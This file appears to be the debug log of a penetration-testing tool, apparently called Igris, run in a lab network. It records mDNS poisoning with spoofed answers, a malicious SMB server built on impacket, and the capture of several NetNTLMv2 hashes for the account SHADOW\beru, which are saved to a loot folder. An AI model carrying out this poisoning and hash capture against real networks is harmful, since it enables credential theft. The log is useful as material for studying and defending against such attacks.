+2022-03-02 19:48:21.242 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 19:48:21.246 | INFO     | impacket.smbserver:handle:3756 - Incoming connection (192.168.253.138,50457)
+2022-03-02 19:48:21.246 | INFO     | impacket.smbserver:handle:3756 - Incoming connection (192.168.253.138,50457)
+2022-03-02 19:48:21.252 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 19:48:21.253 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 19:48:21.278 | INFO     | impacket.smbserver:smbComSessionSetupAndX:2461 - AUTHENTICATE_MESSAGE (SHADOW\beru,PC-BERU)
+2022-03-02 19:48:21.278 | INFO     | impacket.smbserver:smbComSessionSetupAndX:2461 - AUTHENTICATE_MESSAGE (SHADOW\beru,PC-BERU)
+2022-03-02 19:48:21.282 | INFO     | impacket.smbserver:smbComSessionSetupAndX:2494 - User PC-BERU\beru authenticated successfully
+2022-03-02 19:48:21.282 | INFO     | impacket.smbserver:smbComSessionSetupAndX:2494 - User PC-BERU\beru authenticated successfully
+2022-03-02 19:48:21.287 | INFO     | impacket.smbserver:smbComSessionSetupAndX:2506 - beru::SHADOW:aaaaaaaaaaaaaaaa:426ef5338e224ffc06929582fafd9f60:010100000000000080707a786e2ed8012db820211704c80c00000000010010004f0067006600660051004c007a004300030010004f0067006600660051004c007a004300020010007a007900440061004800760046007600040010007a0079004400610048007600460076000700080080707a786e2ed80106000400020000000800300030000000000000000100000000200000f393ee15b5fb21bad67a70a7c20b32c4aa011ca5e11936421d9d399c6c8c20150a001000000000000000000000000000000000000900280063006900660073002f007000720075006500620061006100610061002e006c006f00630061006c000000000000000000
+2022-03-02 19:48:21.287 | INFO     | impacket.smbserver:smbComSessionSetupAndX:2506 - beru::SHADOW:aaaaaaaaaaaaaaaa:426ef5338e224ffc06929582fafd9f60:010100000000000080707a786e2ed8012db820211704c80c00000000010010004f0067006600660051004c007a004300030010004f0067006600660051004c007a004300020010007a007900440061004800760046007600040010007a0079004400610048007600460076000700080080707a786e2ed80106000400020000000800300030000000000000000100000000200000f393ee15b5fb21bad67a70a7c20b32c4aa011ca5e11936421d9d399c6c8c20150a001000000000000000000000000000000000000900280063006900660073002f007000720075006500620061006100610061002e006c006f00630061006c000000000000000000
+2022-03-02 19:48:21.308 | INFO     | impacket.smbserver:NetrShareEnum:4641 - NetrShareEnum Level: 1
+2022-03-02 19:48:21.308 | INFO     | impacket.smbserver:NetrShareEnum:4641 - NetrShareEnum Level: 1
+2022-03-02 19:48:21.541 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 19:48:21.542 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 19:48:21.546 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 19:48:21.547 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 19:48:21.552 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 19:48:21.553 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 19:48:21.558 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 19:48:21.559 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 19:48:22.553 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 19:48:22.554 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 19:48:22.556 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 19:48:22.557 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 19:48:24.733 | WARNING  | project.network.mitm.mss:__synchronous_attack:76 - Exiting attack ...
+2022-03-02 19:48:24.733 | WARNING  | project.network.mitm.mss:__synchronous_attack:76 - Exiting attack ...
+2022-03-02 19:48:26.435 | ERROR    | project.shell.igris:do_cd:225 - /home/rsgbengi/Igris/lo is not a directory
+2022-03-02 19:48:26.435 | ERROR    | project.shell.igris:do_cd:225 - /home/rsgbengi/Igris/lo is not a directory
+2022-03-02 19:49:22.521 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 19:49:22.522 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 19:49:22.525 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:115 - [36m(MDNS) Sending packet to fe80::20c:29ff:fe57:7910[0m
+2022-03-02 19:51:04.447 | DEBUG    | project.utils.neo.dboperations:__init__:30 - The neo4j dirver has been created successfully
+2022-03-02 19:51:07.327 | DEBUG    | project.network.poison.poisonselector:do_poison:202 - Starting poison attack using lhost: 192.168.253.135 rhost:192.168.253.138 ipv6:fe80::20c:29ff:fe0e:d73b
+            interface: ens33 mac_address:00:0c:29:0e:d7:3b
+2022-03-02 19:51:07.327 | DEBUG    | project.shell.igris:check_settable_variables_value:250 - Checking the correct value of the necessary settable variables 
+2022-03-02 19:51:07.344 | INFO     | project.network.poison.poisonengine.poisonlauncher:__create_mdns:77 - Running mdns poisoning in the background
+2022-03-02 19:51:07.344 | INFO     | project.network.poison.poisonengine.poisonlauncher:__create_mdns:77 - Running mdns poisoning in the background
+2022-03-02 19:51:07.346 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:start_mdns_poisoning:155 - Starting mdns poisoning...
+2022-03-02 19:51:09.543 | DEBUG    | project.network.mitm.mss:do_mss:203 - Starting malicious smb server attack using ip: 192.168.253.135 
+            interface: ens33 mac_address:00:0c:29:0e:d7:3b lport:445
+2022-03-02 19:51:09.544 | DEBUG    | project.shell.igris:check_settable_variables_value:250 - Checking the correct value of the necessary settable variables 
+2022-03-02 19:51:09.550 | INFO     | project.network.mitm.mss:__wrapper_attack:88 - Running mss the results will be saved in : loot/
+2022-03-02 19:51:09.550 | INFO     | project.network.mitm.mss:__wrapper_attack:88 - Running mss the results will be saved in : loot/
+2022-03-02 19:51:09.556 | INFO     | project.network.mitm.servers.smbserver:start_malicious_smbserver:66 - Starting Malicious SMB Server ...
+2022-03-02 19:51:09.556 | INFO     | project.network.mitm.servers.smbserver:start_malicious_smbserver:66 - Starting Malicious SMB Server ...
+2022-03-02 19:51:09.561 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
+2022-03-02 19:51:09.561 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
+2022-03-02 19:51:09.562 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+2022-03-02 19:51:09.562 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+2022-03-02 19:51:09.562 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+2022-03-02 19:51:09.562 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+2022-03-02 19:51:29.586 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 19:51:29.588 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 19:51:29.589 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:115 - [36m(MDNS) Sending packet to 192.168.253.138[0m
+2022-03-02 19:51:29.641 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 19:51:29.642 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 19:51:29.642 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:115 - [36m(MDNS) Sending packet to fe80::f1f5:96d5:abd5:67a0[0m
+2022-03-02 19:51:29.696 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 19:51:29.698 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 19:51:29.703 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 19:51:29.704 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 19:51:30.576 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 19:51:30.577 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 19:51:30.580 | INFO     | impacket.smbserver:handle:3756 - Incoming connection (192.168.253.138,50458)
+2022-03-02 19:51:30.580 | INFO     | impacket.smbserver:handle:3756 - Incoming connection (192.168.253.138,50458)
+2022-03-02 19:51:30.582 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 19:51:30.583 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 19:51:30.624 | INFO     | impacket.smbserver:smbComSessionSetupAndX:2461 - AUTHENTICATE_MESSAGE (SHADOW\beru,PC-BERU)
+2022-03-02 19:51:30.624 | INFO     | impacket.smbserver:smbComSessionSetupAndX:2461 - AUTHENTICATE_MESSAGE (SHADOW\beru,PC-BERU)
+2022-03-02 19:51:30.625 | INFO     | impacket.smbserver:smbComSessionSetupAndX:2494 - User PC-BERU\beru authenticated successfully
+2022-03-02 19:51:30.625 | INFO     | impacket.smbserver:smbComSessionSetupAndX:2494 - User PC-BERU\beru authenticated successfully
+2022-03-02 19:51:30.630 | INFO     | impacket.smbserver:smbComSessionSetupAndX:2506 - beru::SHADOW:aaaaaaaaaaaaaaaa:f32c87efa952a454838ea7b278c55f30:0101000000000000008d21e96e2ed801d98fc046452acf1c000000000100100066006500570063004f0044005a0053000300100066006500570063004f0044005a005300020010004a006200750045004e00720075006500040010004a006200750045004e0072007500650007000800008d21e96e2ed80106000400020000000800300030000000000000000100000000200000f393ee15b5fb21bad67a70a7c20b32c4aa011ca5e11936421d9d399c6c8c20150a0010000000000000000000000000000000000009001e0063006900660073002f0063006f00730061002e006c006f00630061006c000000000000000000
+2022-03-02 19:51:30.630 | INFO     | impacket.smbserver:smbComSessionSetupAndX:2506 - beru::SHADOW:aaaaaaaaaaaaaaaa:f32c87efa952a454838ea7b278c55f30:0101000000000000008d21e96e2ed801d98fc046452acf1c000000000100100066006500570063004f0044005a0053000300100066006500570063004f0044005a005300020010004a006200750045004e00720075006500040010004a006200750045004e0072007500650007000800008d21e96e2ed80106000400020000000800300030000000000000000100000000200000f393ee15b5fb21bad67a70a7c20b32c4aa011ca5e11936421d9d399c6c8c20150a0010000000000000000000000000000000000009001e0063006900660073002f0063006f00730061002e006c006f00630061006c000000000000000000
+2022-03-02 19:51:30.655 | INFO     | impacket.smbserver:NetrWkstaGetInfo:4534 - NetrWkstaGetInfo Level: 100
+2022-03-02 19:51:30.655 | INFO     | impacket.smbserver:NetrWkstaGetInfo:4534 - NetrWkstaGetInfo Level: 100
+2022-03-02 19:51:30.670 | INFO     | impacket.smbserver:NetrServerGetInfo:4624 - NetrServerGetInfo Level: 101
+2022-03-02 19:51:30.670 | INFO     | impacket.smbserver:NetrServerGetInfo:4624 - NetrServerGetInfo Level: 101
+2022-03-02 19:51:30.710 | INFO     | impacket.smbserver:NetrShareEnum:4641 - NetrShareEnum Level: 1
+2022-03-02 19:51:30.710 | INFO     | impacket.smbserver:NetrShareEnum:4641 - NetrShareEnum Level: 1
+2022-03-02 19:51:36.935 | WARNING  | project.network.mitm.mss:__synchronous_attack:76 - Exiting attack ...
+2022-03-02 19:51:36.935 | WARNING  | project.network.mitm.mss:__synchronous_attack:76 - Exiting attack ...
+2022-03-02 19:52:37.025 | DEBUG    | project.network.mitm.mss:do_mss:203 - Starting malicious smb server attack using ip: 192.168.253.135 
+            interface: ens33 mac_address:00:0c:29:0e:d7:3b lport:445
+2022-03-02 19:52:37.026 | DEBUG    | project.shell.igris:check_settable_variables_value:250 - Checking the correct value of the necessary settable variables 
+2022-03-02 19:52:37.034 | INFO     | project.network.mitm.mss:__wrapper_attack:88 - Running mss the results will be saved in : loot/
+2022-03-02 19:52:37.034 | INFO     | project.network.mitm.mss:__wrapper_attack:88 - Running mss the results will be saved in : loot/
+2022-03-02 19:52:37.058 | INFO     | project.network.mitm.servers.smbserver:start_malicious_smbserver:66 - Starting Malicious SMB Server ...
+2022-03-02 19:52:37.058 | INFO     | project.network.mitm.servers.smbserver:start_malicious_smbserver:66 - Starting Malicious SMB Server ...
+2022-03-02 19:52:37.061 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
+2022-03-02 19:52:37.061 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
+2022-03-02 19:52:37.061 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+2022-03-02 19:52:37.061 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+2022-03-02 19:52:37.062 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+2022-03-02 19:52:37.062 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+2022-03-02 19:52:47.515 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 19:52:47.517 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 19:52:47.517 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:115 - [36m(MDNS) Sending packet to 192.168.253.138[0m
+2022-03-02 19:52:47.553 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 19:52:47.553 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 19:52:47.553 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:115 - [36m(MDNS) Sending packet to fe80::f1f5:96d5:abd5:67a0[0m
+2022-03-02 19:52:47.585 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 19:52:47.585 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 19:52:47.586 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 19:52:47.586 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 19:52:48.526 | INFO     | impacket.smbserver:handle:3756 - Incoming connection (192.168.253.138,50460)
+2022-03-02 19:52:48.526 | INFO     | impacket.smbserver:handle:3756 - Incoming connection (192.168.253.138,50460)
+2022-03-02 19:52:48.550 | INFO     | impacket.smbserver:smbComSessionSetupAndX:2461 - AUTHENTICATE_MESSAGE (SHADOW\beru,PC-BERU)
+2022-03-02 19:52:48.550 | INFO     | impacket.smbserver:smbComSessionSetupAndX:2461 - AUTHENTICATE_MESSAGE (SHADOW\beru,PC-BERU)
+2022-03-02 19:52:48.553 | INFO     | impacket.smbserver:smbComSessionSetupAndX:2494 - User PC-BERU\beru authenticated successfully
+2022-03-02 19:52:48.553 | INFO     | impacket.smbserver:smbComSessionSetupAndX:2494 - User PC-BERU\beru authenticated successfully
+2022-03-02 19:52:48.556 | INFO     | impacket.smbserver:smbComSessionSetupAndX:2506 - beru::SHADOW:aaaaaaaaaaaaaaaa:af8f788cdd1c4a299ade64024779dea0:010100000000000000689f176f2ed80151a0692ec609ccdf000000000100100069006e007300650054007900770071000300100069006e00730065005400790077007100020010005700470046005900510061007a007000040010005700470046005900510061007a0070000700080000689f176f2ed80106000400020000000800300030000000000000000100000000200000f393ee15b5fb21bad67a70a7c20b32c4aa011ca5e11936421d9d399c6c8c20150a0010000000000000000000000000000000000009001e0063006900660073002f0063006f00730061002e006c006f00630061006c000000000000000000
+2022-03-02 19:52:48.556 | INFO     | impacket.smbserver:smbComSessionSetupAndX:2506 - beru::SHADOW:aaaaaaaaaaaaaaaa:af8f788cdd1c4a299ade64024779dea0:010100000000000000689f176f2ed80151a0692ec609ccdf000000000100100069006e007300650054007900770071000300100069006e00730065005400790077007100020010005700470046005900510061007a007000040010005700470046005900510061007a0070000700080000689f176f2ed80106000400020000000800300030000000000000000100000000200000f393ee15b5fb21bad67a70a7c20b32c4aa011ca5e11936421d9d399c6c8c20150a0010000000000000000000000000000000000009001e0063006900660073002f0063006f00730061002e006c006f00630061006c000000000000000000
+2022-03-02 19:52:51.748 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 19:52:51.749 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 19:52:51.753 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 19:52:51.754 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 19:52:51.758 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 19:52:51.759 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 19:52:51.762 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 19:52:51.763 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 19:52:52.762 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 19:52:52.763 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 19:52:52.768 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 19:52:52.770 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 19:52:52.775 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 19:52:52.777 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 19:52:52.782 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 19:52:52.783 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 19:52:54.152 | WARNING  | project.network.mitm.mss:__synchronous_attack:76 - Exiting attack ...
+2022-03-02 19:52:54.152 | WARNING  | project.network.mitm.mss:__synchronous_attack:76 - Exiting attack ...
+2022-03-02 19:53:01.162 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 19:53:01.162 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 19:53:01.163 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:115 - [36m(MDNS) Sending packet to 192.168.253.138[0m
+2022-03-02 19:53:01.206 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 19:53:01.206 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 19:53:01.207 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:115 - [36m(MDNS) Sending packet to fe80::f1f5:96d5:abd5:67a0[0m
+2022-03-02 19:53:01.256 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 19:53:01.257 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 19:53:01.263 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 19:53:01.264 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 19:53:14.777 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 19:53:14.778 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 19:53:14.779 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:115 - [36m(MDNS) Sending packet to 192.168.253.138[0m
+2022-03-02 19:53:14.823 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 19:53:14.824 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 19:53:14.824 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:115 - [36m(MDNS) Sending packet to fe80::f1f5:96d5:abd5:67a0[0m
+2022-03-02 19:53:50.278 | DEBUG    | project.utils.neo.dboperations:__init__:30 - The neo4j dirver has been created successfully
+2022-03-02 19:53:58.886 | DEBUG    | project.network.poison.poisonselector:do_poison:202 - Starting poison attack using lhost: 192.168.253.135 rhost:192.168.253.138 ipv6:fe80::20c:29ff:fe0e:d73b
+            interface: ens33 mac_address:00:0c:29:0e:d7:3b
+2022-03-02 19:53:58.887 | DEBUG    | project.shell.igris:check_settable_variables_value:250 - Checking the correct value of the necessary settable variables 
+2022-03-02 19:53:58.899 | INFO     | project.network.poison.poisonengine.poisonlauncher:__create_mdns:77 - Running mdns poisoning in the background
+2022-03-02 19:53:58.899 | INFO     | project.network.poison.poisonengine.poisonlauncher:__create_mdns:77 - Running mdns poisoning in the background
+2022-03-02 19:53:58.903 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:start_mdns_poisoning:155 - Starting mdns poisoning...
+2022-03-02 19:54:00.345 | DEBUG    | project.network.mitm.mss:do_mss:203 - Starting malicious smb server attack using ip: 192.168.253.135 
+            interface: ens33 mac_address:00:0c:29:0e:d7:3b lport:445
+2022-03-02 19:54:00.346 | DEBUG    | project.shell.igris:check_settable_variables_value:250 - Checking the correct value of the necessary settable variables 
+2022-03-02 19:54:00.355 | INFO     | project.network.mitm.mss:__wrapper_attack:88 - Running mss the results will be saved in : loot/
+2022-03-02 19:54:00.355 | INFO     | project.network.mitm.mss:__wrapper_attack:88 - Running mss the results will be saved in : loot/
+2022-03-02 19:54:00.361 | INFO     | project.network.mitm.servers.smbserver:start_malicious_smbserver:66 - Starting Malicious SMB Server ...
+2022-03-02 19:54:00.364 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
+2022-03-02 19:54:00.365 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+2022-03-02 19:54:00.365 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+2022-03-02 19:54:00.361 | INFO     | project.network.mitm.servers.smbserver:start_malicious_smbserver:66 - Starting Malicious SMB Server ...
+2022-03-02 19:54:00.364 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
+2022-03-02 19:54:00.365 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+2022-03-02 19:54:00.365 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+2022-03-02 19:54:14.504 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 19:54:14.505 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 19:54:14.505 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:115 - [36m(MDNS) Sending packet to 192.168.253.138[0m
+2022-03-02 19:54:14.540 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 19:54:14.541 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 19:54:14.541 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:115 - [36m(MDNS) Sending packet to fe80::f1f5:96d5:abd5:67a0[0m
+2022-03-02 19:54:14.584 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 19:54:14.584 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 19:54:14.585 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 19:54:14.586 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 19:54:15.502 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 19:54:15.502 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 19:54:15.504 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 19:54:15.504 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 19:54:15.514 | INFO     | impacket.smbserver:handle:3756 - Incoming connection (192.168.253.138,50463)
+2022-03-02 19:54:15.514 | INFO     | impacket.smbserver:handle:3756 - Incoming connection (192.168.253.138,50463)
+2022-03-02 19:54:15.549 | INFO     | impacket.smbserver:smbComSessionSetupAndX:2461 - AUTHENTICATE_MESSAGE (SHADOW\beru,PC-BERU)
+2022-03-02 19:54:15.549 | INFO     | impacket.smbserver:smbComSessionSetupAndX:2461 - AUTHENTICATE_MESSAGE (SHADOW\beru,PC-BERU)
+2022-03-02 19:54:15.550 | INFO     | impacket.smbserver:smbComSessionSetupAndX:2494 - User PC-BERU\beru authenticated successfully
+2022-03-02 19:54:15.550 | INFO     | impacket.smbserver:smbComSessionSetupAndX:2494 - User PC-BERU\beru authenticated successfully
